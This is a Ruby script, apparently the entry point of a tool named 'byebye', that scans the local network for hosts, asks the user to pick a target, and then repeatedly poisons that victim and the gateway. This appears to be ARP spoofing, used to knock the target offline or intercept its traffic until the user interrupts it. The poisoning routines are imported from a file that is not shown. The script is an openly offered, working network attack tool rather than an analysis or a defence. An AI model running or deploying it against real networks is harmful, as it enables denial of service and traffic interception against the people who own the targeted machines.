#!/usr/bin/env ruby
require 'rubygems' if RUBY_VERSION < "1.9"

# Local-wide modules
require_relative "src/poison.rb"
require_relative "src/web.rb"

# System gems
require 'optparse'
require 'ostruct'
require 'socket'

# Networking gems
require 'packetfu'
require 'ipscanner'

# Others
require 'terminal-table'
require 'colorize'


# Create a OpenStruct for option parsing
options = OpenStruct.new

# Header graphics
header = """ 

 _             _             
| |__ _  _ ___| |__ _  _ ___ 
| '_ | || / -_) '_ | || / -_)
|_.__/\\_, \\___|_.__/\\_, \\__|
      |__/          |__/       
     Written by: @ex0dus-0x   \n\n"""
     
puts header.colorize(:green)


# Instantiate Parser, grab service and iface
OptionParser.new do |opt|
  opt.banner = "Usage: ./byebye [options]"

  opt.on('-i IFACE', "--interface IFACE", "Input network interface, otherwise defaults") { |o| options.iface = o}
  opt.on('-a ADDRESS', "--address ADDRESS", "Input target address, otherwise prints host table"){ |o| options.address = o}
  opt.on('-m MODE', "--mode MODE", "Input mode to start, web or cli") { |o| options.mode = o}

  opt.on_tail("-h", "--help", "Show this message") do
    puts opt
    exit
  end
end.parse!

# iface is set to option, otherwise defaulted.
# Using iface, grab a hash for our network info...
iface = options.iface || PacketFu::Utils.default_int
info = PacketFu::Utils.whoami?(:iface => iface)

# ... and store key symbols as variables

# This field for the local area network address
ip = info[:ip_saddr]
# This field for MAC Address
mac = info[:eth_saddr]

# This "hacky" way to get gateway IP and MAC Address
gateway_ip = 
  case Gem::Platform.local.os
    when "darwin" then `netstat -rn -f inet | grep 'default' | awk '{print $2}'`
    else `ip route | awk '/default/{print $3}'`
  end
gateway_mac = PacketFu::Utils.arp(gateway_ip, :iface => iface)


config = PacketFu::Utils.ifconfig(iface)

if( options.mode == "web" ) 
  ByeApp.set :iface => iface, :mac => mac, :gateway_ip => gateway_ip, :gateway_mac => gateway_mac
  ByeApp.run!
  exit
elsif( options.mode == "cli" )
  # Continue execution
else
  raise "No service provided! Please specify web or cli service to get started.".colorize(:red)
end

# create a global array for terminal-table
$rows = []
# create a global variable for address option, even if none is provided
$address = options.address || nil


puts "Interface: #{iface} \nLocal Area IP: #{ip}\nMAC: #{mac}\n\nGateway IP: #{gateway_ip}Gateway MAC: #{gateway_mac}\n"
sleep 3


if ( $address == nil )
  puts "\n-a flag NOT set. Displaying host table: ".colorize(:yellow)

  # for each ip address in LAN, print in a new terminal-table row
  Socket.do_not_reverse_lookup = false
  IPScanner.scan.each { | i |
      $rows << ["#{Socket.getaddrinfo(i, nil)[1][2]}", "#{Socket.getaddrinfo(i, nil)[1][3]}"]      
        # => Name, IP Address
  }

  # instantiate table w/ header and created rows, output it
  table = Terminal::Table.new :headings => ["Hostname", "Local Area Network Address"], :rows => $rows
  
  puts table
  
  print "> Enter your target selection: "
  $address = gets.chomp
    
end

while true
  begin
    sleep 1
    puts "Deauthenticating... #{$address}"
    
    poison_victim(iface, mac, gateway_ip, $address)
    poison_router(iface, mac, gateway_ip, gateway_mac, $address)
    
  rescue Interrupt
    restore(iface, mac, gateway_ip, gateway_mac, $address)
    puts "Killing program! Exiting.".colorize(:red)
    exit
  end
end 

